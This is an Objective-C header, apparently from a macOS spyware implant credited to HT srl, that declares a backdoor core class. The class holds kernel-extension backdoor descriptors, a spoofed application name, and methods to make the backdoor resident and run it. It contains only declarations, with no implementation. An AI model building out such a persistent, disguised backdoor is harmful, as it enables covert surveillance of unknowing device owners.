/*
 * RCSIpony - Core Header
 *  pon pon
 *
 *
 * Created by Alfredo 'revenge' Pesoli on 07/09/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#ifndef __RCSICore_h__
#define __RCSICore_h__

#import "RCSIUtils.h"
#import "RCSISharedMemory.h"

@interface RCSICore : NSObject
{
@private
  // backdoor descriptor for our own device
  int mBackdoorFD;
  // backdoor ID returned by our kext
  int mBackdoorID;
  // advisory lock descriptor -- not used as of now.
  int mLockFD;
  
@private
  // executable binary name
  NSString *mBinaryName;
  // application bundle name (without .app)
  NSString *mApplicationName;
  NSString *mSpoofedName;
  
@private
  NSString *mMainLoopControlFlag; // @"START" | @"STOP" | @"RUNNING"
  
@private
  RCSIUtils         *mUtil;
}

@property (readwrite)       int mBackdoorFD;
@property (readwrite)       int mBackdoorID;
@property (readwrite)       int mLockFD;
@property (readwrite, copy) NSString *mBinaryName;
@property (readwrite, copy) NSString *mApplicationName;
@property (readwrite, copy) NSString *mSpoofedName;
@property (readwrite, copy) NSString *mMainLoopControlFlag;
@property (readonly)        RCSIUtils *mUtil;


- (id)initWithKey:(int)aKey
 sharedMemorySize:(int)aSize
    semaphoreName:(NSString *)aSemaphoreName;

- (void)dealloc;

- (BOOL)makeBackdoorResident;
- (BOOL)isBackdoorAlreadyResident;

- (BOOL)runMeh;

@end

#endif
